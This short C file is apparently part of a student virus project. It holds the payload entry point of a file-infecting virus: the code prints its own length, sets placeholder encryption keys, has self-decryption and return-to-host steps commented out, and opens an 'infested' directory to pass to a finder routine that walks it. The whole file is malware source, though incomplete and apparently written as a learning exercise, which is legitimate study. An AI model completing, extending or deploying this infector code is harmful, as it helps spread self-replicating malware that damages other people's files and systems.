#include "ft_virus.h"

void start(void)
{
	payload();
	EXIT(0);
}

void payload()
{
	t_data data;
	int fd;

	WRITE(1, "Payload length: ", 16);
	ft_putnbr(&payload_end - &payload);
	WRITE(1, "\n", 1);
	data.key = 0xdeadbeaf;
	data.decrypt_start = 0xdeadbeaf;
	//mprotect_us();
	//decrypt();
	fd = OPEN(INFESTED_DIR, O_RDONLY | O_DIRECTORY);
	if (fd == -1)
		return ;
	finder(data, fd);
	CLOSE(fd);
	//go_to_start();
}

void payload_end(void)
{
	;
}

